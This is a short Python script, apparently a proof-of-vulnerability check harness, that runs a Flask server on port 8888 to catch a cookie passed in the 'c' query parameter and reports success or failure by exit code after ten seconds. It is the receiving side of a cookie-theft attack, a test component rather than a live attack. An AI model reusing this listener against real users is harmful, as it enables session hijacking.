from cProfile import run
import sys
import os

import signal
import time
from pwn import *
from flask import Flask, request, redirect
from datetime import datetime

server=None
cookieTasty=""

def handler(signum, frame):
    global cookieTasty
    print('Process timeout.')
    #stopserver()
    if cookieTasty == "":
        print('[FAILED] POV Failed')
        exit(27)
    else:
        print('GOT COOKIE:', cookieTasty)
        exit(13)
    exit(0)

def runserver():
    global server
    server=app.run(host='0.0.0.0', port=8888)
    server.start()
def stopserver():
    global server
    server.terminate()

app= Flask(__name__)
@app.route('/')
def cookie():
    global cookieTasty
    cookieTasty=request.args.get('c')
    #print("FOUND:", cookieTasty, flush=True)
    return {}


if __name__=="__main__":
    signal.signal(signal.SIGALRM, handler)
    signal.alarm(10)
    runserver()
